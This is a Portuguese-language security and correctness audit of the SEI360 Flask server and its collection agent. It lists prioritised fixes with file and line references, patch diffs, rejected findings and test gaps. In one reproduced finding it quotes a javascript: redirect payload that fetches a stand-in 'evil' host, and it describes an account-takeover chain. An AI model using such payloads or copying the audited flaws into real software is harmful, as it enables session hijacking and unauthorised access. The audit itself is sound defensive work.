# RELATÓRIO DE AUDITORIA — SEI360

Escopo: `C:\Claude\sei_sistema\sei360\servidor\` + `C:\Claude\sei_sistema\sei360\agente\sei360_agente.py`. Todos os achados abaixo foram relidos no código; os marcados **[repro]** foram reproduzidos nesta máquina.

---

## 1. Veredito

**Não dá para subir.** O container sobe verde e responde 500 em todas as rotas: `banco.migrar()` só é chamado dentro de `if __name__ == "__main__"` (`app.py:664-665`) e o `CMD` do Dockerfile é `gunicorn app:app`, que importa o módulo — o esquema nunca é criado. **[repro]** Com `SEI360_DADOS` apontando para volume vazio: `GET /saude` → 500 `no such table: snapshot`, `GET /entrar` → 500, `/` → 302 para a tela que também 500a.

Travam junto: (2) mesmo criando o esquema à mão, **não existe caminho de criar o primeiro admin dentro do container** — `semear.py:44` chama `ingerir(None)`, que cai em `ingestao.py:58-61` (glob no caminho Windows `C:\Claude\...\_coletas`, e `*.json` está no `.dockerignore`) e morre com `sys.exit("nenhuma coleta em _coletas/")`; (3) o login devolve `destino` cru vindo de `?proximo` e o JS da própria página faz `location.href = j.destino` — **[repro]** `{"ok":true,"destino":"javascript:fetch('https://evil/x')"}`.

Depois desses três, o sistema é operável. O resto é sério mas não impede o primeiro deploy — com uma exceção que exige decisão consciente: a fronteira por unidade é a decisão central da arquitetura e hoje ela é alargada em silêncio pela tela de `/admin` (**[repro]** contra `_dados/sei360.db`: 4 contas renderizam marcada uma unidade que não têm).

---

## 2. Ajustes por prioridade

### Crítica — bloqueia o deploy

| Onde | Ajuste |
|---|---|
| `app.py:664-665` | Chamar `banco.migrar()` no nível de módulo (todo o DDL é `CREATE TABLE IF NOT EXISTS`, `banco.py:199`) ou pôr um entrypoint que rode `python banco.py` antes do gunicorn. **[repro]** |
| `semear.py:44` + `ingestao.py:23` | Dar ao container um caminho de bootstrap: `semear.py` não pode depender de `RAIZ_COLETAS` (caminho Windows) para criar o primeiro admin — separar "criar admin" de "ingerir coleta", ou aceitar `--coleta` obrigatório e montar o JSON por volume. |
| `app.py:160-161` + `templates/login.html:53,97` | Sanear `proximo` no servidor: só aceitar valor que comece com `/` e não comece com `//` nem `/\` e não contenha `:` antes da primeira `/`; senão `url_for('painel')`. **[repro]** |

### Alta

| Onde | Ajuste |
|---|---|
| `templates/admin.html:112` | Trocar `un in x.unidades` (teste de SUBSTRING sobre o `GROUP_CONCAT` de `app.py:330-332`) por comparação contra lista: montar `{uid: set(unidades)}` em `admin()` ou, no mínimo, `un in (x.unidades or '').split('; ')`. **[repro]: `servidor@sei360.local`, `t.alvo@`, `t.novo@`, `t.servidor@` renderizam CHECKED em `SESAB/SAIS/DGGUP/DGESS` (20 processos) sem ter o vínculo; `app.py:385-388` faz DELETE+INSERT do que a tela mandou, então o fantasma vira concessão ao salvar.** |
| `app.py:627` | Remover o ternário: `fora = {v for v in vistas if v} - esperadas`, e recusar 409 quando `esperadas` for vazio. **[repro]: com escopo vazio `fora=set()` e o 409 nunca dispara — o agente configurado como mais restrito é o único sem limite.** Acrescentar validação em `app.py:409` e uma ação de editar `unidades_esperadas` em `admin_agente` (hoje só existe criar/agendar/janela_extra/novo_codigo). |
| `app.py:391-394` + `semear.py:77-78` | Criar ação `nova_senha` no `admin_usuario` (gera provisória, zera `senha_trocada_em`, revoga sessões). Hoje `revogar` não toca em `senha_hash`, e as **57 contas com `senha_hash NULL`** criadas por `auto_snapshot` ficam permanentemente inacessíveis ao serem ativadas em `app.py:379` — sem caminho de correção pela aplicação, e `admin.html:89-91` ainda as rotula "senha provisória". |
| `app.py:376` (e `421`, `450`) | Não passar segredo por URL: renderizar a provisória direto na resposta do POST (ou chave de uso único). `Dockerfile:39-41` roda gunicorn com `--access-logfile -` e formato padrão (`%(r)s` com query, `%(f)s` Referer), e `admin.html:6` pede o CSS same-origin — o segredo é gravado em duas ou mais linhas de log. Além disso a provisória **não expira** (nada em `banco.py:52-63`, nada em `entrar_post`). |
| `app.py:646-648` + `janelas.py:121,127` | Exigir `tzinfo` no carimbo publicado (`fromisoformat` aceita `2026-08-19T07:45:00` sem offset) e normalizar defensivamente em `idade()`. **[repro]: `TypeError: can't subtract offset-naive and offset-aware datetimes` — e como `estado_coleta()` é chamada em `app.py:110/315/347/661`, uma linha ruim derruba até a tela de login, permanentemente.** |
| `app.py:121` e `app.py:313` | Ler `request.remote_addr` com `ProxyFix(app.wsgi_app, x_for=1, x_proto=1)` (ou o ÚLTIMO elemento do XFF). Hoje o `[0]` é texto do cliente: alimenta `seg.ip_excedeu` (`seguranca.py:158-162`) — 20 req/min com o IP de saída NAT do órgão devolve 429 ao painel inteiro — e escreve `log_acesso.ip`, `sessoes.ip`, `tentativas_login.ip`. |
| `app.py:527-532` + `agente:236,239` | Duas metades do mesmo travamento permanente: (a) servidor sem varredor de `em_curso` — `heartbeat_em` é escrito em `app.py:585,588` e **nunca lido**, `perdida`/`nao_executada` existem no CHECK (`banco.py:128-129`) e nunca são atribuídos; (b) agente com o relógio de parede DENTRO do `for linha in proc.stdout`, que bloqueia sem prazo em travamento mudo. Agravante: `janela_extra` (`app.py:435-437`) está sob a mesma trava e falha em silêncio, então não há destrave pela interface. |
| `app.py:319` | `coleta_em=max([c["texto"] ...])` roda sobre TODAS as unidades (a lista filtrada `unidades` está na linha 318, ao lado) e compara STRINGS. **[repro]: `max(verde, amarelo, vermelho)` → "último dia útil (18/08 07:45)"; `max(verde, vermelho)` → "coletado hoje às 07:45"** — o vermelho nunca ganha. Derivar de `coletado_em` (mínimo) restrito às unidades do usuário. Idem `coleta.pior` e `coleta.candidatos`, globais em `painel.html:396,406`. |
| `ingestao.py:146` | `candidato` é estado terminal: só é escrito ali e lido em `app.py:215`; `rejeitado` nunca é escrito; não há DELETE nem promoção. Criar rota admin de promover/rejeitar snapshot e trocar o `COUNT(*)` global por contagem restrita às unidades do usuário. |
| `app.py:620` | Espelhar `app.py:579`: `SELECT ... FROM execucao WHERE id=? AND agente_id=?` → 404, e estado em `('entregue','em_curso')` → 409. Hoje `resultado()` aceita `execucao_id` de outro agente, ausente (fabrica execução `importacao_manual` em `ingestao.py:107-113`) ou inexistente (FK → 500 sem tratamento). |

### Média

| Onde | Ajuste |
|---|---|
| `app.py:183` | `if u["senha_trocada_em"]: abort(404)` no início da rota — hoje qualquer portador de sessão viva troca a senha sem provar a antiga. **[repro]: POST em conta já trocada → 302 e a senha nova vale.** `exige_login:73-74` só REDIRECIONA para a rota, nunca a fecha. |
| `app.py:377-383` | Recusar quando `uid == request.usuario['usuario_id']` e quando a mudança zeraria os admins ativos; tirar o `onchange="this.form.submit()"` de `admin.html:81` e não renderizar "Desativar" (`admin.html:98`) na própria linha. Sem isso o único admin se tranca fora e só volta por SQL no volume. |
| `Dockerfile:26` + `.dockerignore` | Acrescentar `testes.py` e `semear.py` ao `.dockerignore`. `testes.py:21` tem `SENHA_TESTE` em claro e `testes.py:65-87` escreve direto no banco (`SEI360_DADOS=/dados` no container) plantando `t.admin@teste.local` admin ativo — **o resíduo já existe no banco de desenvolvimento: ids 61-65, `origem='teste'`**. E `testes.py:236-250` sobrescreve o token do PRIMEIRO agente, derrubando a coleta real. |
| `app.py:320` | `falhas=[]` literal torna o aviso "COLETA INCOMPLETA" de `painel.html:489-491` código morto. Alimentar de `alerta WHERE tipo='mesa_falhou' AND reconhecido_em IS NULL`, filtrado por `unidades_do(u)`. O dado existe (`ingestao.py:121-125`) e só aparece em `/admin`. |
| `seguranca.py:126` + comentários em `app.py:468-469` | A chave do HMAC é o próprio Bearer que viaja no mesmo request — a promessa "sobrevive a um proxy que termine o TLS" é criptograficamente falsa. Ou apagar a promessa, ou criar chave de assinatura separada no enrolamento e incluir método, caminho e `execucao_id` na mensagem assinada. |
| `ingestao.py:70-71` vs `app.py:626` | O escopo valida `mesas_coleta`, mas a ingestão define as unidades por `mesas_conta` (e pula por `mesas_falhas`) — campos nunca conferidos. Interseccionar `mesas_conta`/`mesas_falhas` com `unidades_esperadas` quando há `agente_id`. |
| `app.py:239-242` + `295-300` | Dedup por `id_sei` fica com o PRIMEIRO da varredura (sem `ORDER BY`), o que na prática é a unidade alfabeticamente menor, não a mais fresca. Pôr `ORDER BY s.coletado_em DESC, s.id DESC` e incluir `coletado_em` no dict (hoje é selecionado na linha 239 e descartado). |
| `janelas.py:123` | Carimbo no futuro fica `verde/"coletado hoje"` para sempre. **[repro]: `idade('2026-09-30T…')` → `('verde','coletado hoje às 07:45')`.** Recusar carimbo `> agora() + folga` em `app.py:646` e tratar como anomalia em `idade()`. |
| `ingestao.py:165` | Nenhum expurgo existe (única `DELETE FROM` do servidor é `usuario_unidade`, `app.py:385`); `expirado` só rotula. Implementar o job da §7.7 — e antes disso corrigir o esquema: `processo_mesa` (`banco.py:172`) e `processo_texto` (`banco.py:178`) declaram `snapshot_id` **sem** `REFERENCES`, então apagar o snapshot deixa órfão exatamente o texto livre. |
| `app.py:311` | `alvo=f"{len(dados)} processos"` grava contagem onde `banco.py:84` exige identificador; e a exportação (`painel.html:924-946`) é 100% cliente, sem uma linha de log. Registrar `exportar` por beacon e pôr identificador/`snapshot_id` em `alvo`. |
| `app.py:316` (e `/admin`) | Adicionar `@app.after_request` com `Cache-Control: no-store, private`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` e a CSP da §3.3. **Não existe nenhum hook de cabeçalho no projeto** (grep vazio); o HTML com a carteira fica no cache de disco e no bfcache da estação compartilhada depois do logout. |
| `Dockerfile:18,33` vs `ARQUITETURA_ACESSO.md:104,113-115` | Alinhar num caminho só (`/dados`) e garantir dono do bind mount em runtime (uid 10001 não escreve em diretório root:root). O documento manda `SEI360_DB`, `SEI360_SNAPSHOTS`, `SEI360_SECRET_KEY` — **nenhuma dessas é lida pelo código**; o que é lido é `SEI360_DADOS`, `SEI360_SEGREDO` e `SEI360_FORCAR_HTTPS`, e este último nem aparece no documento. |

### Baixa

| Onde | Ajuste |
|---|---|
| `app.py:651` | `os.unlink(tmp)` fora de `try/finally`: qualquer exceção em `ingerir` deixa o JSON bruto da coleta (especificação/anotação/interessados) em `/tmp` do container. Envolver em `try/finally` e fechar `cx` em `finally` (`ingestao.py:106-205`). |
| `app.py:656-661` | `/saude` sem decorador devolve `estado_coleta()` inteiro — caminho hierárquico completo, `suspeito` e `motivo`. **[repro]: 200 anônimo com as 6 unidades e volumes.** Reduzir a `{ok, unidades_correntes}`; nada consome a rota (não há `HEALTHCHECK`, o agente não a chama). |
| `app.py:129-132` | 423 no bloqueio x 401 para inexistente separa "existe e está ativa". Responder 401 sempre e só exibir o texto de bloqueio depois que a senha conferir. Impacto real pequeno: `semear.py:77-78` cria linha para quase todo servidor com `ativo=0`, que cai no 401 eterno. |
| `ingestao.py:23-24, 82-85` | Tirar os caminhos Windows do código (`os.environ.get('SEI360_RESUMOS', ...)`) e trocar o `return {}` mudo por alerta. Observação: consertar o caminho **não** recupera nada sozinho — não há transporte de `resumos.json` para o container (`*.json` no `.dockerignore`, e o corpo publicado não tem campo de resumo). |
| `ingestao.py:133-135` | Comparar `coletado_em` do novo com o do corrente antes de promover: hoje o único portão é a CONTAGEM, então um snapshot mais velho aposenta um mais novo sem alerta (alcançável pela importação manual). |
| `Dockerfile:39` | Acrescentar `HEALTHCHECK` batendo em `/saude` (com `python -c`+urllib; a imagem slim não tem curl) — depois de enxugar o payload. |
| `app.py:28` | Aceitar `SEI360_SECRET_KEY` além de `SEI360_SEGREDO` e abortar o start sem segredo em produção, em vez de sortear por worker. Hoje é código morto (não há `session` nem `flash` em lugar nenhum), mas o operador acredita ter configurado algo que o processo ignora. |
| `app.py:290` | Comparar `resumo.descrito_em` com o `coletado_em` do snapshot e emitir alerta na ingestão (`ingestao.py:192-198`) — o antecessor `gerar_painel.py:66-73` fazia essa checagem e ela se perdeu na porta para o SEI360. |

---

## 3. Os 3 ajustes para fazer AGORA

### 3.1 `app.py` — migrar no import (sem isso nada mais é testável em produção)

```python
# app.py, logo depois de "import banco, seguranca as seg, janelas" (linha ~22)
+ # O CMD do container e "gunicorn app:app": importa o modulo, nunca executa o
+ # bloco __main__. Sem esta chamada, volume novo = 500 em toda rota.
+ try:
+     banco.migrar()          # idempotente: todo o DDL e CREATE TABLE IF NOT EXISTS
+ except Exception as e:
+     print(f"AVISO: migracao falhou no import: {e}", file=sys.stderr)

# linha 664-665, mantem como esta (rodar direto continua funcionando)
```

E, no mesmo commit, o bootstrap do primeiro admin: separar em `semear.py` um `--so-contas` que **não** chame `ingerir()`, ou aceitar que `main()` siga sem coleta quando `RAIZ_COLETAS` não existir. Critério de pronto: `docker run` com volume vazio → `/entrar` responde 200 e existe uma conta admin com senha entregue no stdout.

### 3.2 `app.py:161` — fechar o sink `location.href`

```python
# app.py, antes da linha 160
+ def destino_interno(p):
+     """So caminho do proprio app. 'javascript:' atribuido a location.href
+     EXECUTA no origin ja autenticado (login.html:97), e o cookie CSRF e
+     legivel por JS (app.py:111 e 321) — o payload forja POST autenticado."""
+     if not p or not p.startswith("/") or p.startswith("//") or p.startswith("/\\"):
+         return None
+     if ":" in p.split("/")[0]:
+         return None
+     return p

  destino = url_for("primeiro_acesso") if not u["senha_trocada_em"] else \
-     (request.form.get("proximo") or url_for("painel"))
+     (destino_interno(request.form.get("proximo")) or url_for("painel"))
```

Em `login.html:97`, trocar `location.href = j.destino` por atribuição só depois de checar `j.destino.startsWith('/')`. A decisão fica no servidor; o cliente é reforço. Enquanto isso não sai, **feche também o `/primeiro-acesso`** (`if u["senha_trocada_em"]: abort(404)`), que é a segunda metade da cadeia de tomada de conta.

### 3.3 `templates/admin.html:112` — parar de conceder unidade-pai por substring

```python
# app.py, dentro de admin(), junto do SELECT de usuarios (linha ~330)
+ vinculos = {}
+ for r in cx.execute("SELECT usuario_id, unidade FROM usuario_unidade"):
+     vinculos.setdefault(r["usuario_id"], set()).add(r["unidade"])
  ...
- return render_template("admin.html", usuarios=usuarios, ...)
+ return render_template("admin.html", usuarios=usuarios, vinculos=vinculos, ...)
```

```jinja
{# templates/admin.html:112 #}
- {% if x.unidades and un in x.unidades %}checked{% endif %}
+ {% if un in vinculos.get(x.id, []) %}checked{% endif %}
```

E em `app.py:385-388`, validar que cada `un` recebido existe em `snapshot.unidade` e registrar no log a DIFERENÇA (concedidas/revogadas), não só a lista final. Nota: o mesmo `DELETE`+`INSERT` revoga em silêncio qualquer vínculo cuja unidade não esteja mais em `SELECT DISTINCT unidade FROM snapshot` — falha fechada, mesmo ponto de correção.

**De carona (uma linha, custo zero):** `app.py:627`, apagar ` if esperadas else set()`.

---

## 4. O que NÃO precisa mexer

Sete achados morreram na verificação. Não gaste tempo com eles.

1. **"Tentativa durante o bloqueio não é gravada, some do limite por IP e da reincidência"** — a premissa é certa (o 423 sai antes do INSERT), as consequências não. A reincidência conta as falhas de 24h que SÃO gravadas: a pena de 60 min dispara no terceiro bloqueio (~30 min), não "nunca". E as requisições não contadas são exatamente as que não testam senha nenhuma (`app.py:130-132` retorna antes de `conferir_senha`). Pior: o "conserto" proposto criaria DoS indefinido — gravar falha durante o bloqueio reescreveria `bloqueado_ate` a cada martelada (`seguranca.py:184-186`).

2. **"Metade da lista PROIBIDAS é inalcançável"** — verdade factual, impacto zero: `seguranca.py:60` rejeita `len<12` antes da lista, e as 6 entradas curtas já eram recusadas. O conjunto de senhas aceitas é idêntico com ou sem elas. E `primeiro_acesso.html:31-32` só declara as duas regras que de fato valem.

3. **"`proc.kill()` não mata a árvore no Windows, sobra Chromium órfão"** — o tree-kill existe, no driver do Playwright: matar o python fecha o pipe, o node dispara `gracefullyProcessExitDoNotHang` e executa `taskkill /pid <chromium> /T /F`. `_perfil_sei` está hoje sem lockfile após dias de execução. O defeito real na mesma região é outro e já está na tabela (o relógio dentro do `for linha in proc.stdout`).

4. **"Busca livre sobre especificação/anotação contraria o aceite A1(e)"** — A1(e) proíbe busca de **abrangência global**; `carteira()` filtra por unidade no SQL três vezes. E apagar o campo de busca não retiraria um caractere da tela: `ideia()` (`painel.html:581-586`) já imprime especificação e anotação em toda linha, a anotação inteira já vai no `title` (`painel.html:825-828`) e o CSV é client-side. A divergência real com a spec é outra — `processo_texto` no payload de LISTA (§8.1#2) —, e o vetor é o payload, não a busca.

5. **"`MAX_CONTENT_LENGTH` de 64 MB em rota sem autenticação"** — `agente_autenticado()` (`app.py:470-479`) retorna para token desconhecido ANTES do `get_data()`, então a amplificação no caminho autenticado não é alcançável por atacante. A restrição de disponibilidade é `threads × timeout` (`Dockerfile:39`), não o teto de corpo; baixar para 4 MB não muda nada. Endurecimento, não vetor.

6. **"Sem nonce: 'início' duplicado devolve execução concluída a 'em_curso'"** — o agente recalcula ts e HMAC a cada chamada (`agente:67-79`), a `Trava` local mata o segundo processo e o ramo `ocupada` (`app.py:527`) impede o segundo receber execução. E quem captura o pacote para repetir capturou o Bearer no mesmo pacote — anti-replay não protege quando a chave viaja junto. O perigo de `em_curso` terminal é real e já está na tabela por outra causa (ausência de reaper).

7. **"`/api/agente/resultado` aceita `execucao_id` de outro agente" como falsificação de procedência visível** — a assimetria com `app.py:579` existe e vale corrigir (está na tabela como alta), mas **nenhuma tela lê `snapshot.execucao_id`**: `JOIN execucao` aparece uma vez só (`app.py:336`) e liga a execução ao próprio `agente_id` dela. A corrupção é latente, aparece só em perícia — não há "tela de admin apontando para a estação errada" hoje.

---

## 5. Lacunas de teste em `testes.py`

As 46 verificações passam com todos os defeitos acima vivos. Grep no arquivo: **zero ocorrências** de `proximo`, `X-Forwarded`, `candidato`, `queda`, `log_acesso`, `export`, `coleta_em`, `processo_texto`.

**Furos na própria verificação já feita (o teste passa *porque* não olha):**

- **Fronteira por unidade em `/admin`**: o teste 5 exercita a query de `carteira()` (e até usa regex com fronteira `(?![\w/-])` em `testes.py:205-209` **porque conhece a armadilha do prefixo**), mas `/admin` só é buscado como `t.admin@teste.local`, cujo `GROUP_CONCAT` é `None` — nenhum checkbox renderiza. Falta: buscar `/admin` como admin e afirmar que o número de `checked` bate com `SELECT COUNT(*) FROM usuario_unidade` de cada usuário.
- **Caminho do container**: nenhum teste importa `app:app` com `SEI360_DADOS` vazio. Falta o caso que expõe a crítica #1 — importar o módulo (não rodar `app.py`) e exigir 200 em `/saude`.
- **`/primeiro-acesso` após a troca**: `testes.py:150-169` só exercita a conta criada com `trocada=False`. Falta: POST com `senha_trocada_em` já preenchido → deve dar 404.
- **Escopo do agente vazio**: `testes.py:285-289` só passa porque o agente vem de `semear.py:86-90` com a lista cheia. Falta: agente com `unidades_esperadas='[]'` publicando qualquer unidade → deve dar 409.
- **`/saude` anônimo**: `testes.py:305-308` confere status 200 e `unidades_correntes`, nunca inspeciona o payload. Falta: afirmar que a resposta anônima **não** contém nome de unidade nem `motivo`.

**Caminhos sem nenhum teste:**

- `?proximo` arbitrário (o único teste do login pós-autenticação, `testes.py:154-155`, cobre justamente o ramo imune da senha provisória).
- Cabeçalho `X-Forwarded-For` forjado — nem no login nem no `log_acesso`.
- Carimbo sem offset, carimbo no futuro, e `coletado_em` ausente (`app.py:646-648`).
- Queda de volume / `candidato` / `--forcar` / `suspeito` — a fatia inteira do gate de ingestão.
- `coleta_em` e `falhas` no painel (a única asserção sobre a tela de acesso, `testes.py:100-107`, é sobre contador fictício e CDN).
- Trilha de auditoria: nenhuma asserção sobre `log_acesso` — nem que `ver_carteira` é gravado, nem o que vai em `alvo`.
- Caminho feliz e republicação de `/api/agente/resultado` (só o 409 fora de escopo é exercitado).
- `POST /admin/usuario` nunca é chamado: `testes.py:65-78` cria usuário por SQL cru — o que é, por si só, evidência de que o caminho de aplicação para provisionar credencial não existe.

**Um cuidado ao escrever os novos testes:** `testes.py:20` aponta para `http://127.0.0.1:8360` e escreve direto no banco via `conectar()`. Antes de acrescentar caso, faça o arquivo recusar-se a rodar contra base que não seja de desenvolvimento (abortar se `SEI360_DADOS` for `/dados` ou se houver marcador de produção) e gerar a senha com `secrets` em vez da constante literal de `testes.py:21`.